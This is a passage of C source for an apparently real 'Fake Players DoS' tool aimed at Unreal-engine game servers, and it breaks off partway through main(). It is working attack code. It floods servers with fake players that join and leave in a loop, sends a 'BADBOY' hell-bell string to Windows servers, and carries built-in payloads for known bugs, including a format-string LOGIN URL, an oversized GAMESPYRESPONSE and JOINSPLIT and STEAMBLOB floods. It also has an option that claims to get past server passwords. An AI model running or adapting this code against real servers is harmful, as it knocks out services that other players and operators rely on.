#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include "rwbits.h"
#include "show_dump.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define sleepms sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define sleepms(X)  sleep((X) * 1000)
#endif

#ifdef WIN32
    #define quick_thread(NAME, ARG) DWORD WINAPI NAME(ARG)
    #define thread_id   DWORD
#else
    #define quick_thread(NAME, ARG) void *NAME(ARG)
    #define thread_id   pthread_t
#endif

thread_id quick_threadx(void *func, void *data) {
    thread_id       tid;
#ifdef WIN32
    if(!CreateThread(NULL, 0, func, data, 0, &tid)) return(0);
#else
    pthread_attr_t  attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if(pthread_create(&tid, &attr, func, data)) return(0);
#endif
    return(tid);
}

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.2.5"
#define PORT        7777
#define BUFFSZ      1024    // the max supported is 576
#define SLEEPMS_DEF 20
#define MAXALLGUIDS 128
#define HELLBELL    "BADBOY " \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a"

#define UT2_QUERY   "\x79\x00\x00\x00\x00"  // not used
#define GS1_QUERY   "\\info\\"              // \status\ returns 3 packets, I'm too lazy to handle all of them
#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00"                    "\xff\x00\x00" "\x00"
#define GS3_QUERY   "\xfe\xfd\x09" "\x00\x00\x00\x00"
#define GS3_QUERYX  "\xfe\xfd\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"



enum EChannelType {     // Unreal public source code 224v
    CHTYPE_None = 0, // Invalid type.
    CHTYPE_Control = 1, // Connection control.
    CHTYPE_Actor = 2, // Actor-update channel.
    CHTYPE_File = 3, // Binary file transfer.
    CHTYPE_Voice = 4,
    CHTYPE_MAX = 8, // Maximum.
}; 

typedef struct {
    int     AckPacketId;
    int     ChIndex;
    int     ChType;
    int     ChSequence;
    int     PacketId;
    u8      bOpen;
    u8      bClose;
    u8      bReliable;
} bunch_t;



int udp_sock(int forced_port) {
    static struct   sockaddr_in *peerl = NULL;
    static struct   linger  ling = {1,1};
    static int      on = 1;
    int     sd;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on));
    //setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));

    // must change port everytime
    if(!peerl) {
        peerl = malloc(sizeof(struct sockaddr_in));
        peerl->sin_addr.s_addr = INADDR_ANY;
        peerl->sin_port        = htons(~time(NULL));
        peerl->sin_family      = AF_INET;
    }
    if(forced_port <= 0) {
        peerl->sin_port++;  // for the next
    } else {
        peerl->sin_port = htons(forced_port);
    }
    while(bind(sd, (struct sockaddr *)peerl, sizeof(struct sockaddr_in)) < 0) {
        peerl->sin_port++;  // yeah on little endian it's not sequential and this is what I want
    }
    return(sd);
}
void fake_players_socket(int sd) {  // simple to add function for not closing sockets
    #define MAXFAKESOCKS    256
    static int  socks[MAXFAKESOCKS],
                socksp,
                init    = 1;
    int         i;

    if(init || (sd < 0)) {
        for(i = 0; i < MAXFAKESOCKS; i++) socks[i] = -1;
        socksp = 0;
        init   = 0;
        return;
    }
    if(socksp >= MAXFAKESOCKS) socksp = 0;
    if(socks[socksp] >= 0) close(socks[socksp]);
    socks[socksp] = sd;
    socksp++;
}
int lame_random_gen(u8 *data, int size);
void hex2guid(u8 *in, u8 *out);
u8 *hex2str(u8 *in, int *outsz);
u8 hex2byte(u8 *hex);
quick_thread(client, int sd);
void activate_fix(int *fix);
int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg);
u8 *rndhash(int size);
int unreal_info(struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
int fgetz(u8 *data, int len, FILE *fd);
int calc_authresp(int num);
int write_unrnum(int num, u8 *buff, int bits);
int read_unrnum(int *num, u8 *buff, int bits);
int write_unrser(int num, u8 *buff, int bits, int max);
u8 *unreal_parse_pck(u8 *buff, int size, int *chall, u8 *ret_buff);
int unreal_build_pck(u8 *buff, int pck, int channel, ...);
int read_unreal_index(u8 *index_num, int *ret);
int write_unreal_index(int number, u8 *index_num);
u32 read_bitx(u32 bits, u8 *in, u32 *in_bits);
int read_bitmem(u8 *in, int inlen, u8 *out, int bits);
int write_bitmem(u8 *in, int inlen, u8 *out, int bits);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int     aafix           = 0,    // America's Army uses 0x800 instead of 0x3ff
        aa3fix          = 0,    // America's Army 3
        u3fix           = 0,    // Unreal 3 no longer uses index numbers
        rvfix           = 0,    // RavenShield uses 0x50f instead of 0x3ff (this is useless since it's compatible with AA)
        pariahfix       = 0,    // Pariah / Warpath
        movfix          = 0,    // Men of Valor / Star Wars Republic Commando
        unreal1fix      = 0,    // Unreal 1
        vegasfix        = 0,    // Demonware AGORA, Rainbow Six Vegas 2 (maybe Vegas 1 too?)
        devafix         = 0,    // Devastation
        biafix          = 0,    // Brothers in Arms (EiB)
        // khgfix          = 0, // Klingon Honor Guard uses readbits 16 1 9 16 3 and 12 instead of index numbers
        verbose         = 0,
        quiet           = 0,
        challenge_fix   = 0,
        hex_challenge   = 0,
        force_team      = 0,
        force_fix       = 0,
        send_verbose    = 0,
        send_hexdump    = 0,
        fast_connect    = 1,    // now disabled by default because is not possible to know if the server supports or not this method, use -F
        force_fast      = 0,    // do NOT touch!
        force_full      = 0,    // do NOT touch!
        first_time      = 1,
        bug             = 0,
        enable_bug      = 0;
u8      *gamestatefix[] = {
        "", // none
            // the order of the hash of GAMESTATE checked in memory is 77778888555566661111222233334444
            // the second part of the GAMESTATE hash is the MD5 of "SCR3W3DD@P00CH" and the MD5 of the file (for example SwatGame.u)
            // Swat4 requires 32 successful GAMESTATEs, it's enough to send the same one 32 times plus the other GAMECONFIG command
        "GAMESTATE FA1F998D4D4C2E5F492B79FF1D58488E5e2b7c57161e65909c8c7b01923aa4c4",   // UT2XMP demo
        "GAMESTATE 520996A03FACE2BE4FF9A24F17158B3B7c07dc2b72044ef0e6278707e9e8b0f6",   // UT2003
        // "GAMESTATE D2ECC882E8945E68413DDF3DCB7A1BBEfe95745de189869e61331593a64f33de",   // SWAT4
        NULL
        };

static const u8 x_option[] =
            "          1 = America's Army     2 = Unreal 3 engine    3 = Unreal 1\n"
            "          4 = Pariah/WarPath     5 = Men of Valor/SWRC  6 = Raven Shield\n"
            "          7 = America's Army 3   8 = Vegas 2 (DW AGORA) 9 = Devastation\n"
            "          10= Brothers in Arms\n"
            "          0 = automatic (default)\n";
static const u8 B_option[] =
            "          1  = \"NumInRec<=RELIABLE_BUFFER\" bug (unreliable)\n"
            "          2  = SWAT4 bug A (swat4x)\n"
            "          3  = SWAT4 bug B (swat4x)\n"
            "          4  = -d all (unreaload)\n"
            "          5  = America's Army 3 (aa3boh)\n"
            "          6  = Tripwire games (tripwireless)\n"
            "          7  = unroldcrash, bug B\n"
            "          8  = (unrhellbell, same as -b)\n"
            "          9  = Warpath/Pariah DoS (warpariahdos)\n"
            "          10 = format string (unrfs)\n"
            "          11 = JOINSPLIT server full with one player\n"
            "          12 = Unreal Tournament 3 <= 2.1 (ut3steamer)\n";



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     oldtime;
    FILE    *fd;
    int     i,
            sd,
            len,
            pck                 = 0,
            ver                 = 0,
            chall               = 0,
            all_guidsn          = 0,
            sendbytes_strn      = 0,
            sendbytes_chan      = 0,
            sendbytes_times     = 0,
            lame_random         = 0,
            lame_random_chan    = 0,
            lame_random_times   = 0,
            interactive         = 0,
            onlyone             = 0,
            infoquery           = 1,
            sendauth            = 0,
            gamestatefixn       = 0,
            random_username     = 0,
            force_closesock     = 0,
            download_all        = 0,
            waitdelay           = -1,
            loop                = 0,
            //force_fix_on      = 0,
            sendbytes_after     = 1;
    u16     port                = PORT,
            myport              = 0;
    u8      all_guids[MAXALLGUIDS][16],
            //buff[BUFFSZ + 1],
            *buff               = NULL,
            hello[BUFFSZ+1]     = "",
            auth[BUFFSZ+1]      = "",
            login[BUFFSZ+1]     = "",
            input[BUFFSZ+1]     = "",
            hellover[64+1]      = "",
            pass[64+1]          = "",
            tmpchall[12+1]      = "",
            *cmd_only           = NULL,
            *cmd_plus           = "",
            *login_plus         = "",
            *pete_pkt           = "PETE PKT=1 PKG=1",
            *repeat             = "REPEAT",
            *critobjcnt         = "CRITOBJCNT 1",
            *download_guid      = NULL,
            *sendbytes_str      = NULL,
            *cmd_file_1         = NULL,
            *cmd_file_2         = NULL,
            *errmsg             = NULL,
            *host               = NULL,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Unreal engine basic client and Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s [options] <host> <port>\n"
            "\n"
            "Options:\n"
            "-c \"C\"    send only the custom command C, use -s/S for multiple times\n"
            "-C \"C\"    send the custom command C plus the others needed to join\n"
            "-z FILE   as -c but gets the commands from FILE (line per line)\n"
            "-Z FILE   as -C but gets the commands from FILE (line per line)\n"
            "-s S C N  send a sequence of bytes S to channel C N times after join, examples:\n"
            "          -s \"11 22 33 44556677  888\" 2 1\n"
            "          -s \"JOIN\" 1 1000            (channel 1 is the only in text format)\n"
            "          -s \"0000000033*500\" 2 -1    (tons of logs in UT2004!)\n"
            "-S S C N  exactly as above but the command is sent before the join\n"
            "-R C N    send random bytes to channel C for N times (suggested C 2 and N 100)\n"
            "-l \"S\"    add a custom URL string S to the LOGIN command, for example:\n"
            "          -l \"Index.ut2?Name=player?Class=EnginePawn?Character=Jakob?team=1\"\n"
            "          -l \"?Name=player?UserName=UserName?MAC=\"\n"
            "          -l \"ui_bink_master?Name=player?team=0?Face=0\"\n"
            //"          -l \"Entry.aao?Name=Recruit?Class=AGP_Characters.AGP_Character?team=255?UserName=UserName?MAC=\"\n"
            "-v        verbose mode, show all the commands received from the server\n"
            "-V        show all the commands sent by this tool, use -D for the hex dump of\n"
            "          the outgoing raw packet\n"
            "-I        experimental interactive mode for sending custom commands (debug)\n"
            "-x N      force the activation of a protocol compatibility fix, where N is for:\n"
            "%s"
            "-d GUID   request the downloading of the file which has a specific GUID\n"
            "          use the GUID \"ALL\" for requesting all the files in use on the server\n"
            "-F        force the fast method which allows to test this tool with servers\n"
            "          protected by password without knowing the keyword (not all the games)\n"
            "-X MS     fake players join/exit continuosly each MS milliseconds (%d), this\n"
            "          value is used also to control the delay of other operations (-s/S)\n"
            "-b        Windows dedicated server hell bell attack through the BADBOY command\n"
            "-B NUM    choose a particular bug to test, the name within () is my advisory:\n"
            "%s"
            "\n"
            "Rarely useful options:\n"
            "-i        do NOT query the server for informations and for hostport\n"
            "-u        force the sending of a LOGIN command with a random UserName field\n"
            "          like for America's Army (automatic)\n"
            "-a        force the sending of the AUTH command (automatic)\n"
            "-1        only one fake player, debug\n"
            "-f        use the full method (HELLO + LOGIN and so on), needed with some games\n"
            "          of the Unreal 1 engine to avoid the crash of the server (automatic)\n"
            "-P PORT   force the usage of the local source port PORT\n"
            "-q        quiet, no dots showed\n"
            "\n", argv[0], x_option, SLEEPMS_DEF, B_option);
        exit(1);
    }

    argc -= 2;
    for(i = 1; i < argc; i++) {
        if(((argv[i][0] != '-') && (argv[i][0] != '/')) || (strlen(argv[i]) != 2)) {
            printf("\nError: wrong argument (%s)\n", argv[i]);
            exit(1);
        }
        switch(argv[i][1]) {
            case 'v': verbose       = 1;                break;
            case 'V': send_verbose  = 1;                break;
            case 'D': send_hexdump  = 1;                break;
            case 'f': force_full    = 1;                break;
            case 'c': cmd_only      = argv[++i];        break;
            case 'C': cmd_plus      = argv[++i];        break;
            case 'z': cmd_file_1    = argv[++i];        break;
            case 'Z': cmd_file_2    = argv[++i];        break;
            case 'S': {
                sendbytes_after     = 0;
                sendbytes_str       = argv[++i];
                sendbytes_chan      = atoi(argv[++i]);
                sendbytes_times     = atoi(argv[++i]);
                break;
            }
            case 's': {
                sendbytes_str       = argv[++i];
                sendbytes_chan      = atoi(argv[++i]);
                sendbytes_times     = atoi(argv[++i]);
                break;
            }
            case 'R': {
                lame_random         = 1;
                lame_random_chan    = atoi(argv[++i]);
                lame_random_times   = atoi(argv[++i]);
                break;
            }
            case 'l': {
                login_plus          = argv[++i];
                fast_connect        = 0;
                break;
            }
            case '1': onlyone       = 1;                break;
            case 'i': infoquery     = 0;                break;
            case 'a': sendauth      = 1;                break;
            case 'b': {
                cmd_only            = HELLBELL;
                force_closesock     = 1;
                break;
            }
            case 'u': {
                random_username     = 1;
                fast_connect        = 0;
                break;
            }
            case 'x': {
                force_fix = atoi(argv[++i]);
                if(force_fix <= 0) {
                    printf("Available compatibility fixes for -x:\n%s\n", x_option);
                    exit(1);
                }
                break;
            }
            case 'I': interactive   = 1;                break;
            case 'd': download_guid = argv[++i];        break;
            case 'F': force_fast    = 1;                break;
            case 'X': {
                waitdelay           = atoi(argv[++i]);
                force_closesock = 1;
                break;
            }
            case 'B': {
                bug = atoi(argv[++i]);
                if(bug <= 0) {
                    printf("Available bugs for -B:\n%s\n", B_option);
                    exit(1);
                }
                break;
            }
            case 'P': myport        = atoi(argv[++i]);  break;
            case 'q': quiet         = 1;                break;
            default: {
                printf("\nError: wrong argument (%s)\n", argv[i]);
                exit(1);
            }
        }
    }
    if(i > argc) {
        printf("\nError: recheck your options, you have missed one or more parameters\n");
        exit(1);
    }

    host = argv[argc];
    port = atoi(argv[argc + 1]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    //peerl.sin_addr.s_addr = INADDR_ANY;
    //peerl.sin_port        = htons(time(NULL));
    //peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(0xffff);
    if(!buff) std_err();

    switch(bug) {
        case 1: /* done later */ break;
        case 2: cmd_only = "VERIFYCONTENT"; break;
        case 3: cmd_plus = "GAMESPYRESPONSE RS=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; break;
        case 4: download_guid = "all"; break;
        case 5: {
            force_fix       = 7;
            sendbytes_str   = "JOINSPLIT";
            sendbytes_chan  = 1;
            sendbytes_times = 100;
            login_plus      = "ui_bink_master?Name=player?team=0?Face=0";
            fast_connect    = 0;
            break;
        }
        case 6: cmd_only = "STEAMCLIENTBLOB"; break;
        case 7: force_full = 1; break;
        case 8: {
            cmd_only        = HELLBELL;
            force_closesock = 1;
            break;
        }
        case 9: cmd_only = "DISABLESPLIT GAMEPAD=0"; break;
        case 10: {
            login_plus   = "?Class=%n%n%n%n%s%s%n%n%s%s";
            fast_connect = 0;
            break;
        }
        case 11: {
            onlyone         = 1;
            force_fix       = 2;
            sendbytes_str   = "JOINSPLIT";
            sendbytes_chan  = 1;
            sendbytes_times = 64;
            login_plus      = "ui_bink_master?Name=player?team=0?Face=0";
            fast_connect    = 0;
            break;
        }
        case 12: {
            force_fix = 2;
            cmd_only  = "STEAMBLOB B=";
            break;
        }
        default: break;
    }

    if(infoquery && (ntohs(peer.sin_port) != 7777)) {
        ver = unreal_info(&peer);
        if(ver) sprintf(hellover, "MINVER=%d VER=%d", ver, ver);
    }

        /* full list of parameters and values parsed by various games which use the Unreal engine
        USERFLAG (number)
        HELLO
            MINVER=
            VER=
        AUTH
            HASH=
            RESPONSE=
            USERNAME=
            PASSWORD=
            GM=
        NETSPEED (number >= 1800)
        HAVE
            GUID=
            GEN=
        SKIP
            GUID=
        LOGIN
            RESPONSE=
            URL=
        JOIN
        BADBOY (followed by the string visualized in the console)
        PETE
            PKT=
            PKG=
        REPEAT
        OPENVOICE (number)
            // UT2003
        CRITOBJCNT (number, similar to PETE)
        GAMESTATE (ID)
            NAME=
            // SWAT4
        GAMESPYRESPONSE
            RS=
        GAMESPYSTATRESPONSE
            PID=
            RS=
        VERIFYCONTENT
            FILE=
            MD5=
        GAMECONFIGCOUNT (number)
        GAMECONFIG
            CONFIGFILE=
            CONFIGMD5=
            // Warpath and Pariah
        JOINSPLIT
            GAMEPAD=
            GUESTNUM=
        DISABLESPLIT
            GAMEPAD=
        EPIC (hash)
            // Raven Shield
        SERVERPING
        ARMPATCH
            // UT3
        DEBUG
        ABORT
            GUID=
        JOINSPLIT
        */
        // generic in-game commands: open namecount start map servertravel say disconnect

    if(force_fast) {
        fast_connect = 1;
        force_full   = 0;
    } else if(force_full) {
        fast_connect = 0;
        force_fast   = 0;
    }
    if(cmd_plus && !strncmp(cmd_plus, "PETE ", 5))       pete_pkt   = "";
    if(cmd_plus && !strncmp(cmd_plus, "REPEAT ", 7))     repeat     = "";
    if(cmd_plus && !strncmp(cmd_plus, "CRITOBJCNT", 10)) critobjcnt = "";
    if(download_guid) {
        if((download_guid[0] == '*') || !stricmp(download_guid, "ALL")) {
            download_guid = NULL;
            download_all  = 1;
        } else {
            p = malloc(16);
            hex2guid(download_guid, p);
            download_guid = p;
        }
    }
    if(sendbytes_str) {
        if(sendbytes_chan == CHTYPE_Control) {
            sendbytes_strn = strlen(sendbytes_str);
        } else {
            sendbytes_str = hex2str(sendbytes_str, &sendbytes_strn);
        }
    }

    printf("\n- start attack:\n");

    if(force_fix) {
        //force_fix_on = force_fix;
        sd = udp_sock(myport);
        errmsg = unreal_parse_pck("\x80\x80", 1, NULL, NULL);
        force_fix = 0;
        goto handle_error_message;
    }

    for(;;) {
        printf("\n  Player: ");
        pck = 0;
        sd = udp_sock(myport);

        /* NEVER enable because HELLO is ever needed otherwise the server doesn't accept the commands
        if(cmd_only && force_fix_on) {
            // if the user specifies -x and -c then avoid the guessing of the fixes?
        } else */
        if(
           bug || interactive ||    // needed otherwise is not possible to guess the work-around
           !fast_connect || u3fix || movfix || aa3fix) {    // Unreal 3 requires the LOGIN packet, while MOV crashes!
            sprintf(hello, "HELLO %sREVISION=0 %s", (u3fix || aa3fix) ? "P=1 " : "", hellover);

            len = unreal_build_pck(buff, pck++, CHTYPE_Control, hello, NULL);
            len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, &chall, &errmsg);
            if(len < 0) goto handle_error_message;

            sprintf(tmpchall, hex_challenge ? "%08X" : "%i", chall);    // I don't know if this is right, seems that U3 doesn't check the challenge!
            //sprintf(login, "LOGIN RESPONSE=%i URL=Index.ut2?Name=player?Class=EnginePawn?Character=Jakob?team=1%s%s", chall, pass[0] ? "?password=" : "", pass);
            sprintf(login, "LOGIN RESPONSE=%s URL=%s%s%s%s", tmpchall, login_plus, force_team ? "?Team=1" : "", pass[0] ? "?password=" : "", pass);
            if(random_username) sprintf(login + strlen(login), "?UserName=%s", rndhash(5));
        }

        if(sendauth) {
            sprintf(auth, "AUTH HASH=%s GM=%s USERNAME=%s PASSWORD=%s", rndhash(16), rndhash(66), rndhash(4), rndhash(16));
        }

        if(bug == 1) {
            enable_bug = 1;
            printf("\n- \"NumInRec<=RELIABLE_BUFFER\" bug:\n");
            for(i = 0; i < 256; i++) {  // 128 was enough
                len = unreal_build_pck(buff, pck++, CHTYPE_Control, "", NULL);
                len = unreal_send_recv(sd, buff, len, NULL, 0, &peer, NULL, &errmsg);
                if(len < 0) break;
                sleepms((waitdelay >= 0) ? waitdelay : SLEEPMS_DEF);
            }
            close(sd);
            printf("\n- done\n");
            return(0);
        }

        if(interactive) {
            loop = 1;
            verbose = 1;
            quick_threadx(client, (void *)sd);
            printf("\n"
                "- insert the desired Unreal commands (like AUTH, JOIN, HAVE, SKIP and so on)\n"
                "  use the command unrealfp_hello to send a new HELLO (if server doesn't reply)\n"
                "  use the command unrealfp_socket to use a new socket\n"
                "  use the command unrealfp_port PORT to use a new socket on source port PORT\n"
                "  use the command unrealfp_loop NUM to send the next command NUM times\n"
                "\n");
            for(;;) {
                fgetz(input, sizeof(input), stdin);
                p = strchr(input, ' ');
                if(p) *p = 0;
                if(!stricmp(input, "unrealfp_hello")) {
                    strcpy(input, hello);
                    p = NULL;
                    //continue; // do not continue, send it
                } else if(!stricmp(input, "unrealfp_socket") || !stricmp(input, "unrealfp_sock")) {
                    close(sd);
                    pck = 0;
                    sd = udp_sock(myport);      // you can't recvfrom on an unconnected socket
                    connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
                    quick_threadx(client, (void *)sd);
                    continue;
                } else if(!stricmp(input, "unrealfp_port") && p) {
                    close(sd);
                    pck = 0;
                    sd = udp_sock(atoi(p + 1)); // you can't recvfrom on an unconnected socket
                    connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
                    quick_threadx(client, (void *)sd);
                    continue;
                } else if(!stricmp(input, "unrealfp_loop") && p) {
                    loop = atoi(p + 1);
                    continue;
                }
                if(p) *p = ' ';

                len = 0;
                for(i = 0; i < (unsigned)loop; i++) {
                    len = unreal_build_pck(buff, pck++, CHTYPE_Control, input, NULL);
                    len = unreal_send_recv(sd, buff, len, NULL, 0, &peer, NULL, &errmsg);
                    if(len < 0) break;
                    if(i) sleepms((waitdelay >= 0) ? waitdelay : SLEEPMS_DEF);
                }
                if(len < 0) break;
                loop = 1;
            }
            close(sd);
            printf("\n- done\n");
            return(0);
        }

        #define SENDBYTES_STR \
            printf("\n- send %d custom bytes to channel %d for %d times\n", sendbytes_strn, sendbytes_chan, sendbytes_times); \
            for(i = 0; i < (unsigned)sendbytes_times; i++) { \
                if(sendbytes_chan == CHTYPE_Control) { \
                    len = unreal_build_pck(buff, pck++, sendbytes_chan, sendbytes_str, NULL); \
                } else { \
                    len = unreal_build_pck(buff, pck++, sendbytes_chan, sendbytes_str, sendbytes_strn, NULL); \
                } \
                len = unreal_send_recv(sd, buff, len, NULL, 0, &peer, NULL, &errmsg); \
                if(len < 0) goto handle_error_message; \
                sleepms((waitdelay >= 0) ? waitdelay : SLEEPMS_DEF); \
            }

        if(sendbytes_str && !sendbytes_after) {
            SENDBYTES_STR
        }

        #define CMD_FILE(X) \
            if(X) { \
                printf("\n- send the commands located in the file %s\n", X); \
                fd = fopen(X, "rb"); \
                if(!fd) std_err(); \
                for(;;) { \
                    len = fgetz(input, sizeof(input), fd); \
                    if(len < 0) break; \
                    if(!len) continue; \
                    len = unreal_build_pck(buff, pck++, CHTYPE_Control, input, NULL); \
                    len = unreal_send_recv(sd, buff, len, NULL, 0, &peer, NULL, &errmsg); \
                    if(len < 0) goto handle_error_message; \
                    sleepms((waitdelay >= 0) ? waitdelay : SLEEPMS_DEF); \
                } \
                fclose(fd); \
            }

        CMD_FILE(cmd_file_1)

        if(cmd_only) {
            len = unreal_build_pck(buff, pck++, CHTYPE_Control, cmd_only, NULL);
        } else {
            len = unreal_build_pck(buff, pck++, CHTYPE_Control,
                auth,   // causes only problems!
                login,
                //"NETSPEED 1800",    // useless
                cmd_plus,
                pete_pkt,
                repeat,
                critobjcnt,
                gamestatefix[gamestatefixn],
                "JOIN",
                NULL);
        }
        len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, NULL, &errmsg);
        if(len < 0) goto handle_error_message;

        if(sendbytes_str && sendbytes_after) {
            SENDBYTES_STR
        }

        CMD_FILE(cmd_file_2)

        if(lame_random) {
            printf("\n- send random bytes to channel %d for %d times\n", lame_random_chan, lame_random_times);
            for(i = 0; i < (unsigned)lame_random_times; i++) {
                len = lame_random_gen(input, 400);  // 4 or 5 is ok so that the player is not kicked, 500 was good too although it's the max
                len = unreal_build_pck(buff, pck++, lame_random_chan, input, len, NULL);
                len = unreal_send_recv(sd, buff, len, NULL, 0, &peer, NULL, &errmsg);
                if(len < 0) goto handle_error_message;
                sleepms((waitdelay >= 0) ? waitdelay : SLEEPMS_DEF);
            }
        }

        if(download_guid) {
            len = unreal_build_pck(buff, pck++, CHTYPE_File, download_guid, 16, NULL);
            len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, NULL, &errmsg);
            if(len < 0) goto handle_error_message;
        }
        if(download_all) {
            all_guidsn = 0;
            printf("\n- collect GUIDs available on the server");
            for(;;) {
                if(!buff[0]) break;
                for(p = buff; (p = strstr(p, "USES GUID=")); p++) {   // stuff received before
                    if(all_guidsn >= MAXALLGUIDS) continue;
                    hex2guid(strchr(p, '=') + 1, all_guids[all_guidsn]);
                    all_guidsn++;
                }
                len = unreal_send_recv(sd, NULL, 0, buff, 0xffff, &peer, NULL, &errmsg);
                if(len < 6) break;  // fast way
            }
            for(oldtime = i = 0; i < all_guidsn;) {
                if(time(NULL) >= oldtime) {
                    oldtime = time(NULL) + 1;
                    p = all_guids[i];
                    printf("\n- request GUID %d: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
                        i,
                        p[3],  p[2],  p[1],  p[0],
                        p[7],  p[6],  p[5],  p[4],
                        p[11], p[10], p[9],  p[8],
                        p[15], p[14], p[13], p[12]);
                    len = unreal_build_pck(buff, pck++, CHTYPE_File, all_guids[i], 16, NULL);
                    len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, NULL, &errmsg);
                    i++;
                } else {
                    len = unreal_send_recv(sd, NULL, 0, buff, 0xffff, &peer, NULL, &errmsg);
                }
                if(len < 0) goto handle_error_message;
            }
        }

        if(onlyone) {
            if(verbose) {
                for(;;) {   // show any other incoming message
                    if(!buff[0]) break;
                    len = unreal_send_recv(sd, NULL, 0, buff, 0xffff, &peer, NULL, &errmsg);
                    if(len < 6) break;  // fast way
                }
            }
            close(sd);
            printf("\n- done\n");
            exit(1);
        }

        if(force_closesock) {
            close(sd);
            if(waitdelay >= 0) sleepms(waitdelay);
        } else {
            fake_players_socket(sd);
        }
        continue;

handle_error_message:
        close(sd);
        if(!errmsg) continue;
        if(strstr(errmsg, "UPGRADE")) {
            p = strstr(errmsg, "MINVER");   // UPGRADE MINVER= VER=
            if(!p) exit(1);
            strncpy(hellover, p, sizeof(hellover));
            hellover[sizeof(hellover) - 1] = 0;
        } else if(strstr(errmsg, "SERVERFULL") || stristr(errmsg, "capacity") || stristr(errmsg, "MaxedOutMessage") || stristr(errmsg, "players") || !strcmp(errmsg, "FAILURE ")) {
            printf(" server full ");
            for(i = 3; i; i--) {
                printf("%d\b", i);
                sleep(ONESEC);
            }
        } else if(strstr(errmsg, "NEEDPW") || strstr(errmsg, "WRONGPW") || stristr(errmsg, "password") || stristr(errmsg, "PassWd")) {
            printf("\n- server is protected with password, insert the keyword: ");
            fgetz(pass, sizeof(pass), stdin);
        } else if(strstr(errmsg, "BRAWL")) {
            gamestatefixn++;
            if(!gamestatefix[gamestatefixn]) {
                if(!fast_connect) {
                    printf("\nError: this game needs one or more GAMESTATE commands not implemented\n");
                    exit(1);
                }
                fast_connect = 0;
                gamestatefixn = 0;
            }
            printf("\n- %s", gamestatefix[gamestatefixn]);
        } else if(stristr(errmsg, "Username")) {
            if(random_username) exit(1);
            printf("\n- activate random UserName in the LOGIN command");
            random_username = 1;
            fast_connect    = 0;
        } else if(stristr(errmsg, "Could not find team")) {
            if(force_team) exit(1);
            printf("\n- activate team fix");
            force_team      = 1;
            fast_connect    = 0;
        } else if(stristr(errmsg, "stats")) {
            if(sendauth) exit(1);
            sendauth        = 1;
        } else if(stristr(errmsg, "CHALLENGE")) {
            challenge_fix++;
            if(challenge_fix == 1) {
                printf("\n- activate the Frontline Fuel of War challenge fix");
            } else if(!hex_challenge) {
                printf("\n- activate the hexadecimal challenge fix");
                challenge_fix = 0;
                hex_challenge = 1;
            } else {
                printf("\n"
                "Error: seems that this game requires a specific challenge-response algorithm\n"
                "       use the options -v -V for debugging\n"
                "\n");
                exit(1);
            }
